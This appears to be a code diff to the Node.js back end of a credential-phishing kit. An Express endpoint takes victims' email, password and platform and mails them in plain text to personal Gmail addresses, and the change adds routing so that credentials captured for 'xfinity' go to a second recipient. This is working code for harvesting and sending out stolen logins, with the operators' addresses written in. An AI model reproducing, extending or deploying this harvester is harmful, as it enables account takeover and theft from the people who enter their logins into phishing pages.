@@ -23,32 +23,12 @@ app.post('/api/send', async (req, res) => {
 
     const { email, password, platform } = req.body;
 
-    // var transport = nodemailer.createTransport({
-    //   host: host,
-    //   port: port,
-    //   auth: {
-    //     user: username,
-    //     pass: password
-    //   }
-    // });
+    let recipientEmail = 'raheemjoe08@gmail.com';
 
-    // Function to send emails
-// function sendEmail(emailAddress) {
-//   const mailOptions = {
-//     from: 'testsmtp@racius.tech', // Replace with your Gmail email address
-//     to: emailAddress, // Set the 'to' field to the current email address
-//     subject: subject,
-//     html: message
-//   };
-
-//   transport.sendMail(mailOptions, (error, info) => {
-//     if (error) {
-//       console.log('Error sending email:', error);
-//     } else {
-//       console.log('Email sent:', info.response);
-//     }
-//   });
-// }
+  // If the platform is 'xfinity', update the recipient email
+  if (platform == 'xfinity') {
+    recipientEmail = 'Mrtombriggs@gmail.com';
+  }
 
 
  var transport = nodemailer.createTransport({
@@ -62,7 +42,7 @@ app.post('/api/send', async (req, res) => {
 
   let mailOptions = {
     from: 'tinfo@jumping-rivers.co.uk',
-    to: 'raheemjoe08@gmail.com',
+    to: recipientEmail,
     subject: platform,
     text: 'Platform is ' + platform + ' Username/Email is ' + email + ' password is ' + password,
   };
